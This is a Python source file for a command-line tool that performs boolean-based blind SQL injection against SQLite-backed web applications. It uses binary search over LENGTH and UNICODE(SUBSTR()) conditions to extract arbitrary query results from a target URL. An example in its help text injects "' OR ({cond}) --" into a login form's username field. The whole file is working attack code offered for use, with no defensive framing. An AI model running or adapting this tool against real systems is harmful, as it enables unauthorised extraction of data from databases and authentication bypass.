#!/usr/bin/env python3
"""
Simple boolean-based blind SQLi extractor (SQLite focused)
"""

import argparse
import sys

import requests

# ----------------------------
# Core request + evaluation
# ----------------------------


def send_request(url, method, data, headers, cookies, timeout):
    try:
        if method.upper() == "GET":
            r = requests.get(
                url,
                headers=headers,
                cookies=cookies,
                timeout=timeout,
                allow_redirects=True,
            )
        else:
            r = requests.post(
                url,
                data=data,
                headers=headers,
                cookies=cookies,
                timeout=timeout,
                allow_redirects=True,
            )
        return r
    except requests.exceptions.Timeout:
        return None
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None


def is_true_boolean(response, true_string=None, true_status=None, false_string=None):
    if response is None:
        return False
    if true_status is not None and response.status_code == true_status:
        return True
    if true_string and true_string in response.text:
        return True
    if false_string and false_string not in response.text:
        return True
    return False


def request_options(args):
    headers = {}
    if args.headers:
        for header in args.headers:
            key, value = header.split(":", 1)
            headers[key.strip()] = value.strip()

    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(";"):
            if "=" in cookie:
                key, value = cookie.strip().split("=", 1)
                cookies[key] = value

    return headers, cookies


# ----------------------------
# Binary search extraction
# ----------------------------


def get_length(query, args):
    print(f"[*] Determining length of: {query}")
    low, high = 0, args.max_length
    length = 0

    while low <= high:
        mid = (low + high) // 2
        # SQLite uses LENGTH()
        cond = f"LENGTH(({query}))>{mid}"
        if evaluate(cond, args):
            low = mid + 1
            length = low
        else:
            high = mid - 1

    print(f"[+] Length = {length}")
    return length


def extract_char(query, position, args):
    """Extract one character using binary search on Unicode code point."""
    low, high = 32, 126  # printable ASCII range

    while low < high:
        mid = (low + high) // 2
        # SQLite: UNICODE(SUBSTR(...))
        cond = f"UNICODE(SUBSTR(({query}),{position},1))>{mid}"
        if evaluate(cond, args):
            low = mid + 1
        else:
            high = mid

    return chr(low)


def extract_string(query, args):
    length = get_length(query, args)
    if length == 0:
        print("[!] Length is 0 - nothing to extract or query failed.")
        return ""

    print(f"[*] Extracting {length} characters...")
    result = ""
    for pos in range(1, length + 1):
        result += extract_char(query, pos, args)
        sys.stdout.write(f"\r[+] Current: {result}")
        sys.stdout.flush()
    print()
    return result


# ----------------------------
# Evaluation of a condition
# ----------------------------


def evaluate(cond, args):
    payload = args.payload.replace("{cond}", cond)

    # Build request
    if args.method.upper() == "GET":
        if "*" in args.url:
            final_url = args.url.replace("*", payload)
        else:
            final_url = args.url + payload
        data = None
    else:
        final_url = args.url
        data = args.data.replace("{payload}", payload) if args.data else None

    headers, cookies = request_options(args)

    response = send_request(
        final_url, args.method, data, headers, cookies, timeout=args.timeout
    )
    return is_true_boolean(
        response,
        true_string=args.true_string,
        true_status=args.true_status,
        false_string=args.false_string,
    )


# ----------------------------
# CLI
# ----------------------------


def main():
    parser = argparse.ArgumentParser(
        description="Simple boolean-based blind SQLi extractor (SQLite focused)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:

  python simple_sqlmap.py -u "http://target/login" -m POST \\
      --data "username={payload}&password=x" \\
      --payload "' OR ({cond}) --" \\
      --true-string "Welcome" \\
      --query "SELECT sqlite_version()"
        """,
    )

    parser.add_argument(
        "-u",
        "--url",
        required=True,
        help="Target URL. Use * as injection marker for GET.",
    )
    parser.add_argument(
        "-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method"
    )
    parser.add_argument("-d", "--data", help="POST data with {payload} placeholder")
    parser.add_argument(
        "--payload",
        required=True,
        help="Payload template. Use {cond} for the condition.",
    )
    parser.add_argument(
        "--query",
        required=True,
        help="SQL query to extract (e.g. SELECT sqlite_version())",
    )

    # Boolean options
    parser.add_argument("--true-string", help="String present when condition is true")
    parser.add_argument("--false-string", help="String present when condition is false")
    parser.add_argument(
        "--true-status",
        type=int,
        default=200,
        help="HTTP status that means true (default: 200)",
    )

    # General
    parser.add_argument("--headers", nargs="*", help="Extra headers (Header: Value)")
    parser.add_argument("--cookies", help="Cookies (name=value; name2=value2)")
    parser.add_argument(
        "--timeout", type=float, default=15, help="Request timeout in seconds"
    )
    parser.add_argument(
        "--max-length",
        type=int,
        default=80,
        help="Maximum expected length of the result",
    )
    args = parser.parse_args()

    if not (args.true_string or args.true_status or args.false_string):
        print(
            "[!] Boolean extraction requires --true-string, --true-status "
            "or --false-string"
        )
        sys.exit(1)

    if "{cond}" not in args.payload:
        print("[!] Payload must contain the {cond} placeholder")
        sys.exit(1)
    print(f"[*] Target      : {args.url}")
    print("[*] Technique   : boolean")
    print(f"[*] Query       : {args.query}")
    print("-" * 55)

    result = extract_string(args.query, args)
    print("-" * 55)
    print(f"[+] Extracted   : {result}")


if __name__ == "__main__":
    main()
